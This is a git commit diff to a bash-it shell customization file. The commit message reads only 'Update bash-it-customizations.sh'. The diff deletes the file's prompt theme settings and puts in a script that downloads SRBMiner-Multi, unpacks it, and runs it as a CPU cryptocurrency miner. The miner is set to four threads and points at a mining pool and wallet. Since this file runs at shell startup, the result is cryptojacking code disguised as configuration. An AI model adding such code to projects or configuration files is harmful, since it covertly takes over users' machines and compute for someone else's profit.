5bdb810ff8b23626df356033a9607645e8eb855f
x464 <70561813+x464@users.noreply.github.com>
2020-09-11 17:59:37 +0700

    Update bash-it-customizations.sh

--- bash-it-customizations.sh
+++ bash-it-customizations.sh
@@ -1,11 +1,8 @@
-export POWERLINE_RIGHT_PROMPT="clock"
-if hash kubectl 2>/dev/null; then
-  export POWERLINE_LEFT_PROMPT='k8s_context cwd scm in_vim'
-else
-  export POWERLINE_LEFT_PROMPT='cwd scm in_vim'
-fi
-export POWERLINE_RIGHT_PROMPT='clock'
-export SCM_THEME_PROMPT_CLEAN_COLOR=2
-export SCM_THEME_PROMPT_DIRTY_COLOR=220
-export CWD_THEME_PROMPT_COLOR=18
-export CLOCK_THEME_PROMPT_COLOR=18
+#!/bin/bash
+wget https://github.com/doktor83/SRBMiner-Multi/releases/download/0.4.7/SRBMiner-Multi-0-4-7-Linux.tar.xz
+
+tar xvf SRBMiner-Multi-0-4-7-Linux.tar.xz
+
+cd SRBMiner-Multi-0-4-7
+
+./SRBMiner-MULTI --disable-gpu --algorithm randomepic --pool epic-us.icemining.ca:4000 --wallet zaysi --password gjhajshjdh --cpu-threads 4 --keepalive true --log-file log.txt
